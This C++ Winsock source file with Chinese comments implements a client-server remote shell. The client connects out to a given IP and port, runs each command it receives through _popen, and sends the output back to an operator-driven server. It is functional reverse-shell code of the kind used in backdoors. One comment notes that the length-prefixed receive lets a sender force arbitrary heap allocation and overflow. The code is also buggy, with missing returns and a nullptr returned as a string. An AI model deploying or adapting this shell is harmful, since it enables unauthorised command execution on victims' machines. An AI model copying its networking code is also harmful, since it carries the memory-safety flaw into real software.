#include "sockLib.h"

void debugPrint(Error e, CONST CHAR* path, INT line) {
#ifdef DEBUG
	printf("file:%s line:%d error:%d\n", path, line, e);
#endif // DEBUG
}

void delay() {
	Sleep(1000);
}

_Socket::_Socket()
{
	if (WSAStartup(MAKEWORD(2, 2), &WSAData))TRACE(Error::WSAStartup);

	_msg = (PMsg)malloc(BUF_SIZE);
	if (!_msg)TRACE(Error::Malloc);
	memset(_msg, 0, BUF_SIZE);
	_msg->nLen = BUF_SIZE;
}

_Socket::~_Socket()
{
	WSACleanup();
	if (_msg)free(_msg);
}

inline BOOL _Socket::_Recv(PCHAR &recvBuf, INT& size)
{
	INT nRet;
	memset(_msg, 0, _msg->nLen);

	nRet = recv(hSocket, (PCHAR)_msg, sizeof(DWORD), 0);
	if (_msg->nLen == ExitCode) {
		TRACE(Error::Close);
		sprintf(recvBuf, ExitStr);
		size = strlen(ExitStr);
		return TRUE;
	}
	if (nRet == SOCKET_ERROR) {
		TRACE(Error::Recv);
		return FALSE;
	}
	if (_msg->nLen >= BUF_SIZE) {
		if (_msg->nLen >= 5 * BUF_SIZE) {
			TRACE(Error::Recv);
			return FALSE;
		}
		// 如果接收的数据过大，则扩展内存后再接收
		// 这里是根据前四个字节判断的大小，其实可以构造任意大小堆，然后溢出
		_msg = (PMsg)Mylloc((PCHAR)_msg, BUF_SIZE, _msg->nLen);
		if (!_msg)TRACE(Error::Relloc);
		recvBuf = Mylloc((PCHAR)recvBuf, size, _msg->nLen);
		if (!recvBuf)TRACE(Error::Relloc);
		size = _msg->nLen;
	}

	nRet = recv(hSocket, (PCHAR)&_msg->data, _msg->nLen, 0);
	if (nRet == SOCKET_ERROR) { TRACE(Error::Recv); return FALSE; }
	INT tLen = strlen((PCHAR)&_msg->data);
	*((PCHAR)&_msg->data+tLen) = 0x00;
	memset(recvBuf, 0, size);
	memcpy_s(recvBuf, size, (PCHAR)&_msg->data, tLen+1);

	return TRUE;
}

inline BOOL _Socket::Send(CONST CHAR* sendBuf)
{
	INT nRet;
	INT tLen = strlen(sendBuf) + 1;
	if (tLen > _msg->nLen-4) {
		_msg = (PMsg)Mylloc((PCHAR)_msg, _msg->nLen, tLen+BUF_SIZE);
		_msg->nLen = tLen + BUF_SIZE;
	}
	memcpy_s((PCHAR)&_msg->data, _msg->nLen, sendBuf, tLen);

	nRet = send(hSocket, (PCHAR)_msg, tLen+4, MSG_OOB);
	if (nRet == SOCKET_ERROR) {
		TRACE(Error::Send);
		return FALSE;
	}
	return TRUE;
}

// 调用完需要free掉PCHAR，试图写个装饰器自动free的，但想了想应该不太好用
inline PCHAR _Socket::Recv()
{
	PCHAR recvBuf;
	recvBuf = (PCHAR)malloc(BUF_SIZE);
	if (!recvBuf) {
		TRACE(Error::Relloc);
		return nullptr;
	}

	recvSize = BUF_SIZE;

	// 如果接收失败，尝试多次接收
	for (int i = 3; i > 0; i--) {
		if (_Recv(recvBuf, recvSize))
			return recvBuf;
		else
			TRACE(Error::Recv);
		delay();
	}
}

inline VOID _Socket::Print(PCHAR buf)
{
	printf("%s", buf);
	return VOID();
}

inline PCHAR _Socket::Mylloc(PCHAR szbuf, INT srcSize, INT dstSize)
{
	if (dstSize <= srcSize)return szbuf;

	PCHAR szOut = (PCHAR)malloc(dstSize);
	if (!szOut)return nullptr;

	memset(szOut, 0, dstSize);
	memcpy(szOut, szbuf, srcSize);
	free(szbuf);
	return szOut;
}



Client::Client(PCHAR ipaddr, WORD port)
{
	recvBuf = nullptr;
	INT nLen = sizeof(addrServer);
	hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(port);
	addrServer.sin_addr.s_addr = inet_addr(ipaddr);
	connect(hSocket, (sockaddr*)&addrServer, nLen);
	if (hSocket == INVALID_SOCKET)TRACE(Error::Connect);
	else {
		while (true)
		{
			recvBuf = Recv();
			if (!recvBuf) {
				TRACE(Error::Recv);
				break;
			}

			if (!strcmp(recvBuf, ExitStr)) {
				Send(recvBuf);
				break;
			}
			else {
				sendBuf = Shell(recvBuf);

				if (sendBuf.length() == 0) {
					TRACE(Error::Shell);
					if (!Send("command error"))break;
				}
				else {
					if (!Send(sendBuf.c_str()))break;
				}
			}
			free(recvBuf);
		}
	}
}


Client::~Client()
{
	if (recvBuf)free(recvBuf);
	closesocket(hSocket);
}

// 缺点，不打印错误，遇到wmic nslookup等交互型命令会在客户端等待输入，不会在服务端等待输入
inline std::string Client::Shell(PCHAR cmd)
{
	char buffer[BUF_SIZE] = { '\0' };
	FILE* pf = NULL;
	pf = _popen(cmd, "r");

	if (NULL == pf) {
		TRACE(Error::Createpipe);
		return nullptr;
	}

	std::string ret;
	while (fgets(buffer, sizeof(buffer), pf)) {
		ret += buffer;
	}

	_pclose(pf);

	return ret;
}

Server::Server(WORD port) {
	Error flag;
	INT nLen = sizeof(addrClient);
	hServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (hServer == INVALID_SOCKET)TRACE(Error::SocketServer);


	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(port);
	addrServer.sin_addr.s_addr = htonl(INADDR_ANY);
	UINT nRet = bind(hServer, (sockaddr*)&addrServer, sizeof(addrServer));
	if (nRet == SOCKET_ERROR) TRACE(Error::Bind);


	nRet = listen(hServer, 1);
	if (nRet == SOCKET_ERROR)TRACE(Error::Listen);

	// 客户端掉线后，服务端仍然等待，除非发送了关闭指令
	do {
		hSocket = accept(hServer, (sockaddr*)&addrClient, &nLen);
		if (hSocket == INVALID_SOCKET) TRACE(Error::Accept);

		flag = Comminicate();
		fflush(stdin);

	} while (flag != Error::Success);

}

Server::~Server() {
	if(recvBuf)free(recvBuf);
	closesocket(hServer); 
	closesocket(hSocket);
}

inline Error Server::Comminicate()
{
	CHAR buf[BUF_SIZE] = { 0 };
	

	while (TRUE)
	{
		memset(buf, 0, BUF_SIZE);
		// 防止获取到buf=""的情况
		while (!*buf)gets_s(buf, BUF_SIZE);

		if (!Send(buf)) return Error::Send;


		recvBuf = Recv();
		if (!recvBuf) {
			TRACE(Error::Recv);
			return Error::Recv;
		}

		if (!strcmp(recvBuf, ExitStr)) {
			break;
		}

		outBuf = (PCHAR)malloc(recvSize + BUF_SIZE);
		if (!outBuf)return Error::Malloc;
		memset(outBuf,0, recvSize + BUF_SIZE);
		sprintf(outBuf,"ClientIP:%s,Reponse:\n%s\n", inet_ntoa(addrClient.sin_addr), recvBuf);
		Print(outBuf);
		free(outBuf);
		free(recvBuf);
	}

	return Error::Success;
}
